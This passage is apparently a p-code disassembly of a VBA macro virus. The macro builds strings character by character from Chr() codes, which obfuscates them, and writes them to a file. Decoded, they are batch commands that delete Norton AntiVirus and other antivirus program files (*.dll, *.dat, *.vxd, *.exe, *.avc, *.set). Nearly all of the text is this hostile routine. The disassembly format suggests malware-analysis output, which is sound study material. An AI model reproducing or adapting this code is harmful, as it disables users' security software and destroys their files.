' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OO$ 
' Line #89:
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PP$ 
' Line #90:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St QQ$ 
' Line #91:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St SS$ 
' Line #92:
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St TT$ 
' Line #93:
' 	Ld OO$ 
' 	Ld PP$ 
' 	Concat 
' 	Ld QQ$ 
' 	Concat 
' 	Ld SS$ 
' 	Concat 
' 	Ld TT$ 
' 	Concat 
' 	St YY$ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld YY$ 
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OO$ 
' Line #95:
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PP$ 
' Line #96:
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St QQ$ 
' Line #97:
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
